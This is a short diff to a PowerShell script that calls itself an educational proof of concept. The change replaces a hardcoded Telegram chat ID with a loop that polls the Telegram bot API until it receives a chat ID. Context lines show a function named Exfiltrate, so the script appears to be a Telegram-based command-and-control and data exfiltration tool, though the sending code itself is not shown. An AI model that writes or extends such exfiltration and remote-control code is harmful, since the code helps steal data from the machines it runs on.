@@ -33,8 +33,14 @@ THIS SCRIPT IS A PROOF OF CONCEPT FOR EDUCATIONAL PURPOSES ONLY.
 #>
 
 $Token = "TOKEN_HERE"
-$ChatID = "CHAT_ID_HERE"
 $URL='https://api.telegram.org/bot{0}' -f $Token 
+
+while($chatID.length -eq 0){
+$updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
+if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
+if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id}}
+Sleep 10
+}
 
 Function Exfiltrate {
 
